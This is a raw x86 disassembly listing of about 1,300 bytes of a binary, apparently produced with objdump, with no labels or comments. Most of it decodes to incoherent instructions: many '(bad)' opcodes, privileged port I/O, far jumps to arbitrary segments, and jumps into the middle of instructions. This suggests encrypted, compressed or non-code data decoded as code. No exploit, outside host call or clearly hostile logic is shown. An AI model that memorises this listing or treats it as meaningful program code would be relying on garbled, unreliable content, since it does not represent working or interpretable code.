  411fea:	jmp    0x33a4:0xe9c8d612
  411ff1:	or     cl,BYTE PTR [edi+esi*2+0x7e3e6124]
  411ff8:	lods   al,BYTE PTR ds:[esi]
  411ff9:	mov    edx,DWORD PTR [esi+0x5b]
  411ffc:	adc    eax,0xc84c0576
  412001:	fstp   TBYTE PTR [edi]
  412003:	pop    ebp
  412004:	cmp    BYTE PTR [edi],bh
  412006:	mov    edi,0x2ebb5737
  41200b:	stc    
  41200c:	dec    BYTE PTR ds:0x43c058b3
  412012:	scas   al,BYTE PTR es:[edi]
  412013:	sbb    BYTE PTR [esi],0x4d
  412016:	rcr    BYTE PTR es:[ecx+0x25],0x54
  41201b:	sub    edi,DWORD PTR [edx]
  41201d:	div    eax
  41201f:	pop    esi
  412020:	imul   esp,DWORD PTR [edi+0x10],0xfffffffd
  412024:	(bad)  
  412025:	aaa    
  412026:	adc    ah,bl
  412028:	mov    esp,DWORD PTR [eax-0xfab6743]
  41202e:	fisubr WORD PTR [edx]
  412030:	rcr    BYTE PTR [ebx],cl
  412032:	sbb    esi,DWORD PTR [esi]
  412034:	int    0xcd
  412036:	mov    ebp,0x5f45d5ea
  41203b:	pop    edi
  41203c:	mov    bl,0x90
  41203e:	add    ebx,DWORD PTR [ecx-0x1e]
  412041:	fisttp WORD PTR [ecx]
  412043:	into   
  412044:	push   edx
  412045:	push   ebp
  412046:	sbb    eax,DWORD PTR [esp+ebx*4+0x72]
  41204a:	ins    BYTE PTR es:[edi],dx
  41204b:	or     edx,ebp
  41204d:	or     al,0x59
  41204f:	xor    BYTE PTR [edi],al
  412051:	cmp    bh,ch
  412053:	mov    ah,0x9f
  412055:	mov    DWORD PTR [eax+edi*8-0x33a74576],0xc52588de
  412060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412061:	in     eax,dx
  412062:	retf   0x1cae
  412065:	push   es
  412066:	push   ebp
  412067:	stos   DWORD PTR es:[edi],eax
  412068:	xor    ebx,ecx
  41206a:	lods   al,BYTE PTR ss:[esi]
  41206c:	ins    BYTE PTR es:[edi],dx
  41206d:	cwde   
  41206e:	out    dx,eax
  41206f:	push   0x82a5d0bc
  412074:	jle    0x412036
  412076:	jl     0x4120be
  412078:	mov    eax,ds:0x9dfd9444
  41207d:	jle    0x4120fc
  41207f:	inc    edx
  412080:	xor    BYTE PTR [eax+0x18a4fefd],ah
  412086:	cmp    eax,0x88ed6d93
  41208b:	fs in  eax,0xe
  41208e:	mov    esi,0x66f4a72a
  412093:	fwait
  412094:	arpl   WORD PTR [eax],si
  412096:	mov    al,ds:0xf245bd8
  41209b:	or     BYTE PTR ds:0x5b26e5a5,bh
  4120a1:	imul   ecx,DWORD PTR [ecx],0x642fcc50
  4120a7:	xchg   ecx,eax
  4120a8:	jp     0x41204b
  4120aa:	ds sbb al,0x3e
  4120ad:	pop    ebx
  4120ae:	xchg   ecx,eax
  4120af:	mov    ds:0x6ef0b9f,al
  4120b4:	rcr    DWORD PTR [ebx+0x13],1
  4120b7:	xor    BYTE PTR [ebp-0x80],al
  4120ba:	test   al,0x4a
  4120bc:	hlt    
  4120bd:	mov    BYTE PTR ds:0x472fdf88,bh
  4120c3:	mov    ecx,0xe8bf73f2
  4120c8:	mov    dh,BYTE PTR [ecx-0x3e7adb10]
  4120ce:	jne    0x412083
  4120d0:	adc    al,0xf3
  4120d2:	enter  0x8c40,0xa8
  4120d6:	fwait
  4120d7:	test   eax,0x3b8c7c96
  4120dc:	repnz xchg ebp,eax
  4120de:	mov    eax,ds:0x69e04cf0
  4120e3:	adc    dl,BYTE PTR [edx-0x29]
  4120e6:	pop    es
  4120e7:	mov    ebx,0xcb0ef985
  4120ec:	ret    
  4120ed:	mov    edi,0x94e3bfc5
  4120f2:	adc    ebp,DWORD PTR [eax+0x39]
  4120f5:	ja     0x4120d2
  4120f7:	jle    0x41216a
  4120f9:	pop    ebp
  4120fa:	jge    0x4120f2
  4120fc:	mov    fs,WORD PTR [eax]
  4120fe:	push   0xffffffc3
  412100:	xchg   ebx,eax
  412101:	stc    
  412102:	and    DWORD PTR [esi*2+0x23b3cb1a],ebx
  412109:	and    al,BYTE PTR [esi-0x60]
  41210c:	xchg   BYTE PTR [eax+0x5c],cl
  41210f:	xlat   BYTE PTR ds:[ebx]
  412110:	fwait
  412111:	ja     0x412184
  412113:	outs   dx,DWORD PTR ds:[esi]
  412114:	out    dx,al
  412115:	cmp    DWORD PTR [edx+0x1a],ebx
  412118:	push   es
  412119:	mov    ecx,ebx
  41211b:	cmp    al,0x58
  41211d:	je     0x4120b8
  41211f:	mov    esi,0xc374e5e3
  412124:	xor    BYTE PTR [edi+0x6a],ah
  412127:	inc    edi
  412128:	das    
  412129:	imul   edi,edx,0x33
  41212c:	sbb    bh,BYTE PTR [esi+0x7b]
  41212f:	mov    ebp,0xa74fa785
  412134:	mov    dh,BYTE PTR [ebp-0x63fca4f]
  41213a:	jae    0x41217c
  41213c:	sub    esp,DWORD PTR [esi-0x21bc523f]
  412142:	loope  0x412154
  412144:	inc    edx
  412145:	in     al,dx
  412146:	imul   eax,DWORD PTR [eax-0x20df9fe2],0x3112f0a7
  412150:	push   es
  412151:	xor    DWORD PTR [edx-0x789aefad],0xffffffe0
  412158:	cld    
  412159:	fwait
  41215a:	popa   
  41215b:	stc    
  41215c:	mov    DWORD PTR [esi+0x5e57d462],ebp
  412162:	jo     0x412131
  412164:	add    bl,BYTE PTR [edx-0x26]
  412167:	pop    ebp
  412168:	ret    0x7bae
  41216b:	shl    BYTE PTR [ebx],1
  41216d:	sahf   
  41216e:	imul   ebx,DWORD PTR [esi+ebx*2-0x11995312],0xffffffdf
  412176:	push   DWORD PTR [edx+0x38babc1b]
  41217c:	and    eax,0x1f6b4163
  412181:	jmp    0xd923:0x97039c2d
  412188:	mov    cl,0xab
  41218a:	(bad)  
  41218b:	test   BYTE PTR [ebx+0x61],bh
  41218e:	js     0x4121ce
  412190:	cs inc esi
  412192:	out    0xdc,eax
  412194:	shr    BYTE PTR [ecx-0x2c607370],1
  41219a:	enter  0xcd7b,0x4b
  41219e:	sbb    esp,DWORD PTR [ebx-0x1a]
  4121a1:	mov    ecx,0xcd4ebd9f
  4121a6:	cmp    BYTE PTR [ebx+0x52],bh
  4121a9:	aas    
  4121aa:	les    ecx,FWORD PTR ds:0xe52f3e4a
  4121b0:	mov    al,ds:0xf3c5aeb6
  4121b5:	aam    0x5d
  4121b7:	xor    DWORD PTR [edi+0x5a7f92ba],esp
  4121bd:	inc    ebp
  4121be:	pop    esi
  4121bf:	popa   
  4121c0:	ins    BYTE PTR es:[edi],dx
  4121c1:	push   ebp
  4121c2:	xchg   edx,eax
  4121c3:	(bad)  
  4121c5:	das    
  4121c6:	mov    eax,ds:0xf8ceda72
  4121cb:	add    ecx,edi
  4121cd:	loope  0x41222e
  4121cf:	ficomp WORD PTR [ecx+0x4a]
  4121d2:	test   BYTE PTR gs:[ebp-0x4d841b48],0xb8
  4121da:	aad    0xea
  4121dc:	mov    dh,0x95
  4121de:	push   0x74
  4121e0:	push   cs
  4121e1:	cli    
  4121e2:	imul   esp,DWORD PTR [edi],0xc1667fde
  4121e8:	mov    dh,0x51
  4121ea:	push   ebx
  4121eb:	mov    eax,ds:0x2b23eda1
  4121f0:	push   es
  4121f1:	out    0xf3,eax
  4121f3:	mov    ebx,0xa3e99328
  4121f8:	push   ds
  4121f9:	imul   esi,DWORD PTR [edi],0xffffff81
  4121fc:	js     0x41227d
  4121fe:	cmc    
  4121ff:	fld    DWORD PTR [edi-0x74]
  412202:	imul   ebp,DWORD PTR [ebx+0xc],0xffffffe0
  412206:	cld    
  412207:	retf   
  412208:	popf   
  412209:	out    dx,eax
  41220a:	push   cs
  41220b:	sub    al,0x5e
  41220d:	jb     0x41222d
  41220f:	jb     0x412262
  412211:	ja     0x41219c
  412213:	outs   dx,DWORD PTR ds:[esi]
  412214:	pop    edi
  412215:	cmp    DWORD PTR [eax-0x595082ee],esp
  41221b:	jp     0x412220
  41221d:	jno    0x41224e
  41221f:	int    0x4f
  412221:	cmp    DWORD PTR [edi+0x4eddb5b7],esi
  412227:	ja     0x41226d
  412229:	arpl   WORD PTR [eax],bp
  41222b:	cmc    
  41222c:	pop    ecx
  41222d:	adc    ebp,DWORD PTR [eax]
  41222f:	xchg   al,ch
  412231:	and    al,0x75
  412233:	(bad)
  412236:	jo     0x412288
  412238:	fadd   QWORD PTR [edi-0x48]
  41223b:	test   BYTE PTR [ecx-0x18a92f91],al
  412241:	push   es
  412242:	dec    BYTE PTR ds:0xa046e0be
  412248:	mov    ah,0x40
  41224a:	and    al,al
  41224c:	mov    esi,DWORD PTR [edi]
  41224e:	adc    eax,0xf209b753
  412253:	dec    ebx
  412254:	push   ecx
  412255:	inc    ebp
  412256:	add    eax,0xa307575a
  41225b:	cmp    BYTE PTR [edx],bl
  41225d:	test   eax,0x44203cac
  412262:	out    dx,al
  412263:	add    BYTE PTR [esp+ebp*8],dl
  412266:	xor    ebp,DWORD PTR [eax]
  412268:	push   eax
  412269:	lds    ecx,FWORD PTR [ebx+ebp*2+0x1153fd75]
  412270:	sbb    eax,0xbd5de3f2
  412275:	jecxz  0x4122c9
  412277:	xor    DWORD PTR [ecx+0x10129692],ebp
  41227d:	sbb    bh,ah
  41227f:	mov    ds:0x3d611ddc,al
  412284:	xlat   BYTE PTR ds:[ebx]
  412285:	repnz mov bh,al
  412288:	retf   
  412289:	rcr    DWORD PTR [ecx+0x64],0xc1
  41228d:	sbb    eax,0x65b84bb3
  412292:	dec    eax
  412293:	stc    
  412294:	in     al,0x3b
  412296:	pop    ss
  412297:	in     al,0xb
  412299:	daa    
  41229a:	mov    ds:0x6f271798,eax
  41229f:	pop    ecx
  4122a0:	lock das 
  4122a2:	push   cs
  4122a3:	mov    dh,0x6d
  4122a5:	(bad)  [ebx-0x16]
  4122a8:	adc    ebx,DWORD PTR [ebp-0x5a]
  4122ab:	and    al,0xe8
  4122ad:	sub    eax,0xef70e3ff
  4122b2:	ins    DWORD PTR es:[edi],dx
  4122b3:	call   0x3a31:0xfb4e013c
  4122ba:	std    
  4122bb:	fldenv [ecx+esi*2+0x2dfbc29c]
  4122c2:	pusha  
  4122c3:	js     0x41227e
  4122c5:	mov    esp,cs
  4122c7:	test   al,0x9
  4122c9:	outs   dx,BYTE PTR ds:[esi]
  4122ca:	sub    BYTE PTR es:[eax],0xa3
  4122ce:	in     eax,dx
  4122cf:	jb     0x412318
  4122d1:	fsubr  st(2),st
  4122d3:	aaa    
  4122d4:	popf   
  4122d5:	inc    esp
  4122d6:	pop    edx
  4122d7:	sbb    dl,dl
  4122d9:	sub    edi,eax
  4122db:	add    ah,dl
  4122dd:	mov    cl,0xba
  4122df:	mov    eax,0xb5fd5a92
  4122e4:	xor    eax,DWORD PTR [ecx]
  4122e6:	sbb    edx,DWORD PTR [esi]
  4122e8:	ds pop es
  4122ea:	pop    ebx
  4122eb:	mov    al,0x40
  4122ed:	pusha  
  4122ee:	dec    ecx
  4122ef:	jne    0x412356
  4122f1:	xchg   ebx,eax
  4122f2:	fld    DWORD PTR [ecx-0x4819fd98]
  4122f8:	pusha  
  4122f9:	bound  edi,QWORD PTR [edi-0x54]
  4122fc:	in     al,0x55
  4122fe:	icebp  
  4122ff:	jne    0x4122ab
  412301:	dec    ebp
  412302:	sub    al,0x10
  412304:	(bad)  
  412305:	sbb    DWORD PTR [ebp-0x11e064a1],ebx
  41230b:	test   DWORD PTR [ebx+0x2d],esi
  41230e:	cld    
  41230f:	push   0x14ce833
  412314:	inc    edx
  412315:	add    eax,0x2b46411
  41231a:	sub    DWORD PTR [esi-0x2d],eax
  41231d:	in     eax,dx
  41231e:	sahf   
  41231f:	nop
  412320:	pop    eax
  412321:	ss jns 0x41237d
  412324:	cmc    
  412325:	lock aas 
  412327:	push   ss
  412328:	pop    ds
  412329:	sub    DWORD PTR [eax-0x56],eax
  41232c:	push   cs
  41232d:	ret    
  41232e:	xor    dh,BYTE PTR [esi]
  412330:	fnstcw WORD PTR [ecx+0x70]
  412333:	mov    ds:0x99377e82,al
  412338:	lock dec ecx
  41233a:	xor    eax,0xdb587000
  41233f:	add    al,0xc0
  412341:	mov    esp,0x3c072254
  412346:	call   0xd97f:0x85dd8e1
  41234d:	sbb    eax,0xb6ed82d2
  412352:	push   cs
  412353:	xchg   ecx,eax
  412354:	imul   esi,DWORD PTR [edi+eiz*4+0x8ef7eb4],0x48
  41235c:	arpl   ax,bx
  41235e:	push   ecx
  41235f:	pop    esi
  412360:	mov    ch,BYTE PTR [ecx]
  412362:	and    bh,BYTE PTR [esi]
  412364:	cmp    DWORD PTR [ebp+0x34],esi
  412367:	out    dx,al
  412368:	jecxz  0x41236b
  41236a:	push   edi
  41236b:	fsubr  st(4),st
  41236d:	ret    0xbe55
  412370:	pop    DWORD PTR [esi]
  412372:	iret   
  412373:	(bad)  
  412374:	jae    0x41232d
  412376:	mov    ah,0x74
  412378:	popf   
  412379:	das    
  41237a:	jo     0x41231f
  41237c:	mov    ecx,0xbfe5bf03
  412381:	in     al,dx
  412382:	rcr    DWORD PTR [ebp-0x5e],0x1f
  412386:	adc    eax,0x89019c81
  41238b:	(bad)  
  41238c:	fwait
  41238d:	mov    ch,0x55
  41238f:	adc    al,0x2b
  412391:	popf   
  412392:	fs push es
  412394:	sbb    BYTE PTR [ecx+edi*1-0x5f],0xfe
  412399:	test   dl,al
  41239b:	dec    edi
  41239c:	lea    edi,[edx+0x44]
  41239f:	cmc    
  4123a0:	outs   dx,BYTE PTR ds:[esi]
  4123a1:	push   es
  4123a2:	sbb    BYTE PTR [edx+0x16ba0aee],ah
  4123a8:	mov    ebp,0x5c068664
  4123ad:	adc    DWORD PTR [eax-0x54],eax
  4123b0:	sub    al,0xbf
  4123b2:	sbb    eax,DWORD PTR [ecx-0x10]
  4123b5:	je     0x4123f4
  4123b7:	sti    
  4123b8:	scas   eax,DWORD PTR es:[edi]
  4123b9:	or     BYTE PTR [edi-0x7a38b141],0xc6
  4123c0:	bound  esp,QWORD PTR [esi+0x1bf75fd9]
  4123c6:	popa   
  4123c7:	pop    edi
  4123c8:	adc    ah,BYTE PTR [edx+0x13]
  4123cb:	pop    edi
  4123cc:	mov    eax,0x4ade2bd1
  4123d1:	shl    dh,cl
  4123d3:	xchg   al,ah
  4123d5:	xchg   edi,eax
  4123d6:	inc    esp
  4123d7:	(bad)  
  4123d8:	dec    edi
  4123d9:	stc    
  4123da:	jl     0x4123b5
  4123dc:	xchg   si,ax
  4123de:	mov    dl,0x7f
  4123e0:	adc    al,0x7e
  4123e2:	pop    esp
  4123e3:	out    0xee,al
  4123e5:	(bad)  
  4123e6:	jmp    0x41243b
  4123e8:	push   ebx
  4123e9:	aam    0xd9
  4123eb:	bound  esp,QWORD PTR [edi+esi*2+0x2096b5ac]
  4123f2:	inc    esp
  4123f3:	jecxz  0x41244f
  4123f5:	inc    ecx
  4123f6:	jbe    0x41245a
  4123f8:	cmp    al,0xfc
  4123fa:	mov    al,BYTE PTR [edi-0x6bf3341d]
  412400:	mov    BYTE PTR [eax+0x52],dl
  412403:	lahf   
  412404:	rcr    DWORD PTR ds:0xf74760f,cl
  41240a:	add    bh,BYTE PTR [ecx]
  41240c:	sbb    al,0xf4
  41240e:	je     0x4123e6
  412410:	(bad)
  412414:	std    
  412415:	push   0xc60acb8a
  41241a:	push   ebp
  41241b:	je     0x412459
  41241d:	xchg   edi,eax
  41241e:	jmp    0x8de2eb39
  412423:	xor    al,0x13
  412425:	(bad)  
  412426:	mov    ah,0xa5
  412428:	inc    edx
  412429:	mov    dh,0x5c
  41242b:	stc    
  41242c:	adc    al,0x83
  41242e:	cwde   
  41242f:	add    DWORD PTR [esp+ecx*1-0x69752706],eax
  412436:	jo     0x4123c6
  412438:	fcom   DWORD PTR [edi-0x18]
  41243b:	iret   
  41243c:	stos   BYTE PTR es:[edi],al
  41243d:	aam    0x17
  41243f:	push   esp
  412440:	int3   
  412441:	popa   
  412442:	jmp    0xf944:0x32bb0a5b
  412449:	(bad)  
  41244a:	cli    
  41244b:	xchg   esi,eax
  41244c:	xchg   BYTE PTR [eax-0x1b7bd47d],bh
  412452:	(bad)  
  412453:	push   eax
  412454:	popa   
  412455:	outs   dx,DWORD PTR ds:[esi]
  412456:	or     DWORD PTR [edi-0x5af9ec40],eax
  41245c:	data16 daa 
  41245e:	in     eax,dx
  41245f:	adc    eax,DWORD PTR [eax+ebx*8-0x39217141]
  412466:	hlt    
  412467:	mov    ss,WORD PTR [ecx+0x359ed08b]
  41246d:	out    0x35,eax
  41246f:	jne    0x4124ec
  412471:	jmp    0x8ff91fa9
  412476:	dec    eax
  412477:	ins    BYTE PTR es:[edi],dx
  412478:	in     eax,0x3b
  41247a:	adc    esi,0x44be85a
  412480:	scas   al,BYTE PTR es:[edi]
  412481:	adc    ebx,DWORD PTR [edi+0x72]
  412484:	repnz xor ah,BYTE PTR [esi+0x37]
  412488:	inc    ecx
  412489:	fbld   TBYTE PTR [edx+0x1c]
  41248c:	out    dx,al
  41248d:	repz push esp
  41248f:	fisub  WORD PTR [eax+0x3b]
  412492:	js     0x41243c
  412494:	in     al,0x50
  412496:	xchg   ebx,eax
  412497:	aas    
  412498:	jne    0x4124cb
  41249a:	mov    eax,0x7ed5f2f
  41249f:	aam    0xe5
  4124a1:	add    dl,0x79
  4124a4:	or     bl,bl
  4124a6:	xchg   dl,bh
  4124a8:	in     eax,dx
  4124a9:	pop    es
  4124aa:	xchg   edx,eax
  4124ab:	loop   0x41245a
  4124ad:	push   0xffffffe9
  4124af:	cmp    bl,dl
  4124b1:	xchg   ebp,eax
  4124b2:	test   ebx,ecx
  4124b4:	push   ds
  4124b5:	sub    al,0x9
  4124b7:	ins    DWORD PTR es:[edi],dx
  4124b8:	push   esi
  4124b9:	mov    dl,0x1f
  4124bb:	sub    al,0x16
  4124bd:	mov    ds:0x2f51ef4d,eax
  4124c2:	jns    0x41248c
  4124c4:	sub    dh,bh
  4124c6:	dec    eax
  4124c7:	mov    dl,0x79
  4124c9:	pop    edx
  4124ca:	rcr    DWORD PTR [edx-0x4ec56265],0x41
  4124d1:	sbb    al,0x5c
  4124d3:	call   0x13bbd491
  4124d8:	aam    0x86
  4124da:	sbb    al,0xe2
  4124dc:	or     ebp,DWORD PTR [di+0x6588]
  4124e1:	imul   esi,edx,0xfffffff2
  4124e4:	xchg   al,bl
  4124e6:	icebp  
  4124e7:	sbb    DWORD PTR [edi+ecx*1],ebp
  4124ea:	mov    eax,0x9e726e88
  4124ef:	pop    edi
  4124f0:	inc    esp
  4124f1:	data16 das 
  4124f3:	scas   al,BYTE PTR es:[edi]
  4124f4:	inc    esp
  4124f5:	push   eax
  4124f6:	std    
  4124f7:	call   0x814344e6
  4124fc:	bound  esp,QWORD PTR [edx]
  4124fe:	cs push esp
  412500:	jge    0x4124e3
  412502:	clc    
  412503:	xchg   BYTE PTR [esi-0x6b],ah
  412506:	xchg   BYTE PTR [ecx-0x4507ae57],dl
  41250c:	pop    esi
  41250d:	add    eax,0x34e84780
  412512:	rcr    BYTE PTR [edx+0x38],cl
  412515:	and    DWORD PTR [ebx-0x6e],edi
  412518:	jb     0x412529
  41251a:	and    esi,DWORD PTR [ebp+0xfc56410]
  412520:	and    eax,0x356f42ea
  412525:	scas   al,BYTE PTR es:[edi]
  412526:	jl     0x412534
  412528:	dec    ebx
  412529:	xchg   edi,eax
  41252a:	mov    ebx,0x57105926
  41252f:	cdq    
  412530:	dec    ebp
  412531:	sub    eax,0xf114cb78
  412536:	out    dx,al
  412537:	inc    ebp
  412538:	pop    ds
  412539:	out    0xd,al
  41253b:	pusha  
  41253c:	lods   eax,DWORD PTR ds:[esi]
  41253d:	and    al,0x87
  41253f:	adc    dl,BYTE PTR [esi+edi*1]
  412542:	mov    WORD PTR ds:0x6632004e,?
  412548:	addr16 mov edx,0x76ecb863
  41254e:	add    esi,DWORD PTR [esi-0x25e7f9a6]
  412554:	inc    ebp
  412555:	es jecxz 0x41256d
  412558:	push   0x34
  41255a:	xor    al,0x3b
  41255c:	fadd   QWORD PTR [ebp+0x73053095]
  412562:	xchg   ebx,eax
  412563:	xor    BYTE PTR [edx-0x53aa115],dh
  412569:	push   edx
  41256a:	(bad)  
  41256c:	adc    bh,BYTE PTR [ecx-0x41433294]
  412572:	sti    
  412573:	xor    al,0x49
  412575:	aad    0x8a
  412577:	jmp    0x10c6:0x205d83f8
  41257e:	pop    eax
  41257f:	and    BYTE PTR [edi],0x13
  412582:	popf   
  412583:	sub    DWORD PTR [esi-0x72],edx
  412586:	ds leave 
  412588:	sub    DWORD PTR [edi-0xd],edx
  41258b:	cmp    ecx,edi
  41258d:	mov    ecx,0xeef968fc
  412592:	pop    ebp
  412593:	mul    esi
  412595:	je     0x4125cc
  412597:	xor    eax,0x2a7e1c41
  41259c:	(bad)  
  41259e:	push   ss
  41259f:	jns    0x412529
  4125a1:	and    al,0x85
  4125a3:	add    ebp,DWORD PTR [edx-0x1202322]
  4125a9:	jmp    0x826:0xbc22dabb
  4125b0:	pop    ebp
  4125b1:	or     al,0x1
  4125b3:	out    0xe3,al
  4125b5:	sub    DWORD PTR [eax+0x79],ebp
  4125b8:	daa    
  4125b9:	or     al,0xc6
  4125bb:	and    dh,dh
  4125bd:	addr16 mov ebx,0x158de69d
  4125c3:	shl    BYTE PTR [ebx+0x536fe166],cl
  4125c9:	sti    
  4125ca:	and    dl,dh
  4125cc:	out    0xe2,al
  4125ce:	out    0xde,eax
  4125d0:	retf   
  4125d1:	cmc    
  4125d2:	cmp    al,0x83
  4125d4:	jl     0x412628
  4125d6:	push   esp
  4125d7:	inc    ecx
  4125d8:	sbb    al,BYTE PTR [ebx-0x40]
  4125db:	sub    al,0x29
  4125dd:	jne    0x4125de
  4125df:	pop    edx
  4125e0:	xor    al,0x4
  4125e2:	jbe    0x412646
  4125e4:	jne    0x4125b1
  4125e6:	xchg   edx,eax
  4125e7:	mov    bl,0xf8
  4125e9:	xchg   esp,eax
  4125ea:	(bad)  
  4125ec:	pushf  
  4125ed:	cld    
  4125ee:	pop    ebx
  4125ef:	addr16 and dl,dl
  4125f2:	out    dx,al
  4125f3:	xor    eax,0x94f48dea
  4125f8:	cdq    
  4125f9:	sbb    BYTE PTR [edx-0x20],dh
  4125fc:	mov    DWORD PTR [edi],ebx
  4125fe:	jge    0x4125db
  412600:	add    DWORD PTR [ebp+0x14],ebx
  412603:	loope  0x412663
  412605:	push   ecx
  412606:	es add eax,0xf139aa96
  41260c:	dec    ecx
  41260d:	and    esi,DWORD PTR [ebx-0x6d]
  412610:	and    DWORD PTR [ecx+0x5e4c09ad],0x2f27271e
  41261a:	call   0x7a75:0xee525357
  412621:	les    edx,FWORD PTR [eax+0x212fea10]
  412627:	xchg   ebx,eax
  412628:	mov    DWORD PTR [edi*4+0x462156a],ecx
  41262f:	adc    eax,0xd109c90e
  412634:	rcr    DWORD PTR [ecx+0x3eb2699e],cl
  41263a:	fnstcw WORD PTR [eax-0x60]
  41263d:	fld    QWORD PTR [ebx+0x78]
  412640:	imul   ebx,ecx,0x5e3a3d3f
  412646:	sub    edx,ebp
  412648:	add    ecx,DWORD PTR [ecx+0x46fac751]
  41264e:	mov    BYTE PTR [ecx+0x245fe345],dl
  412654:	adc    bh,BYTE PTR [edx+0x1506770]
  41265a:	mov    ecx,0xa24b1c33
  41265f:	fnstcw WORD PTR [ecx-0x780e5ef2]
  412665:	(bad)  
  412667:	jg     0x412649
  412669:	dec    edi
  41266a:	add    al,BYTE PTR [esi+0x6]
  41266d:	inc    eax
  41266e:	mov    al,ds:0xa341db36
  412673:	mov    edx,0x72c8088b
  412678:	fwait
  412679:	(bad)  
  41267a:	cdq    
  41267b:	pop    es
  41267c:	mov    ds:0xfb2faadc,eax
  412681:	es aam 0xb9
  412684:	sub    DWORD PTR es:[ebp-0xe],ebp
  412688:	sbb    DWORD PTR [esi],esp
  41268a:	adc    ebp,DWORD PTR [ebx+edi*2-0x61b71bd9]
  412691:	es popa 
  412693:	cmp    ch,BYTE PTR [ebx]
  412695:	push   ebp
  412696:	hlt    
  412697:	inc    ebp
  412698:	and    al,0x6e
  41269a:	push   ss
  41269b:	adc    al,0x3c
  41269d:	out    0x45,al
  41269f:	arpl   WORD PTR ds:0xf7a24906,cx
  4126a5:	dec    ebx
  4126a6:	dec    esp
  4126a7:	xchg   BYTE PTR [esi+0x16],bl
  4126aa:	cmp    BYTE PTR [edi],0x2
  4126ad:	dec    DWORD PTR [ecx+0x4cbb2c4]
  4126b3:	pop    ecx
  4126b4:	pop    esi
  4126b5:	imul   esi,DWORD PTR [ebx-0x498ea2d0],0x63
  4126bc:	(bad)  
  4126bd:	bound  ebx,QWORD PTR [ebx+ecx*8+0x4b]
  4126c1:	call   0xf8d2338a
  4126c6:	cmp    eax,0x807aea41
  4126cb:	retf   0xc838
  4126ce:	popa   
  4126cf:	dec    eax
  4126d0:	test   eax,0x4f757a48
  4126d5:	cwde   
  4126d6:	out    0x96,eax
  4126d8:	sub    BYTE PTR ds:0xb619c193,0x23
  4126df:	daa    
  4126e0:	jae    0x4126ec
  4126e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126e3:	sbb    DWORD PTR [edi+0x1b],0xfb39a04e
  4126ea:	mov    cl,0xad
  4126ec:	mov    bh,0x4e
  4126ee:	shl    DWORD PTR [esi-0x35],cl
  4126f1:	and    esp,DWORD PTR [ebx-0x6f]
  4126f4:	fadd   st(1),st
  4126f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126f7:	sbb    al,0x3f
  4126f9:	mov    dh,BYTE PTR [edi+0x68]
  4126fc:	gs ret 0x2b74
  412700:	(bad)
  412705:	retf   
  412706:	jmp    0x20ece8cc
  41270b:	retf   0x1908
  41270e:	and    BYTE PTR [edx],ch
  412710:	cmp    BYTE PTR [esi],0xc8
  412713:	fisttp WORD PTR ds:0x370f781
  412719:	rol    BYTE PTR [edx],1
  41271b:	ja     0x4126ba
  41271d:	xchg   edi,eax
  41271e:	inc    ebp
  41271f:	mov    al,0xaa
  412721:	out    dx,al
  412722:	mov    ecx,0xf5203fe6
  412727:	add    DWORD PTR [edi-0x1a],esi
  41272a:	sub    dh,bl
  41272c:	xchg   ebx,eax
  41272d:	add    DWORD PTR [edi+0x65],0xffffffea
  412731:	js     0x41275f
  412733:	and    ecx,0xafc2d6d5
  412739:	push   eax
  41273a:	(bad)  
  41273b:	mov    gs,WORD PTR [esi+0x6]
  41273e:	out    0xa,eax
  412740:	sub    edi,esi
  412742:	sub    eax,DWORD PTR [ecx-0x19]
  412745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412746:	loop   0x4126c8
  412748:	test   DWORD PTR [ebx],eax
  41274a:	lea    edi,[ecx+0x54]
  41274d:	aam    0x2d
  41274f:	add    ah,bh
  412751:	outs   dx,BYTE PTR ss:[esi]
  412753:	sbb    ebp,DWORD PTR [ebp-0x52]
  412756:	xchg   esi,edi
  412758:	fcomp  QWORD PTR [edx+0x4d548da2]
  41275e:	sub    bl,dh
  412760:	hlt    
  412761:	mov    edi,0x5f98260b
  412766:	xchg   edi,eax
  412767:	xor    eax,0xed346eb2
  41276c:	mov    DWORD PTR ds:0x4da98b7f,ebp
  412772:	xor    BYTE PTR [ebx],dl
  412774:	sub    BYTE PTR [ebp+0x4e],0xd6
  412778:	outs   dx,DWORD PTR ds:[esi]
  412779:	xor    esp,DWORD PTR [edx-0x7e]
  41277c:	adc    eax,0xe6acc614
  412781:	fucomp st(0)
  412783:	jbe    0x4127c3
  412785:	or     dl,BYTE PTR [ecx-0x77]
  412788:	adc    al,0x7
  41278a:	push   edx
  41278b:	mov    eax,ds:0x53b92aec
  412790:	pop    ebx
  412791:	or     bh,BYTE PTR [edx]
  412793:	in     al,dx
  412794:	add    edx,DWORD PTR [ebp-0x1f36d6b]
  41279a:	sub    al,0x6c
  41279c:	jmp    0x4127d3
  41279e:	cmp    BYTE PTR [edi],dl
  4127a0:	or     BYTE PTR [eax+0x74fea949],0x61
  4127a7:	mov    ch,0x24
  4127a9:	ins    DWORD PTR es:[edi],dx
  4127aa:	dec    edi
  4127ab:	out    0x71,al
  4127ad:	retf   
  4127ae:	lds    ebp,FWORD PTR [edx+0x7c1a96b2]
  4127b4:	mov    al,0x48
  4127b6:	mov    esp,DWORD PTR ds:0xb371d7bb
  4127bc:	jmp    0x412754
  4127be:	add    eax,0x9dd1b16f
  4127c3:	mov    ebx,esi
  4127c5:	or     BYTE PTR [ecx],cl
  4127c7:	jnp    0x41275b
  4127c9:	fs jne 0x4127f5
  4127cc:	(bad)  
  4127ce:	and    al,0x22
  4127d0:	ficomp DWORD PTR ds:0xf1b03843
  4127d6:	add    ch,bh
  4127d8:	lahf   
  4127d9:	(bad)  
  4127da:	stos   DWORD PTR es:[edi],eax
  4127db:	loop   0x4127b4
  4127dd:	loope  0x41280e
  4127df:	push   edx
  4127e0:	popf   
  4127e1:	xchg   ebp,eax
  4127e2:	imul   BYTE PTR [edx]
  4127e4:	test   BYTE PTR [edx],cl
  4127e6:	push   esi
  4127e7:	test   BYTE PTR [ebp+0x32],dl
  4127ea:	(bad)  ds:0x772e4276
  4127f0:	mov    al,ds:0x849f39b5
  4127f5:	sbb    ecx,DWORD PTR [ebp-0xe]
  4127f8:	sbb    DWORD PTR [edx-0xb],ebx
  4127fb:	mov    ds:0xb0505867,eax
  412800:	inc    edi
  412801:	in     al,0xe4
  412803:	mov    esp,DWORD PTR [esi+0x1f95369]
  412809:	test   DWORD PTR [ecx-0x7e],esi
  41280c:	sbb    edx,DWORD PTR [ebp+0x15dc7d27]
  412812:	pop    ds
  412813:	push   cs
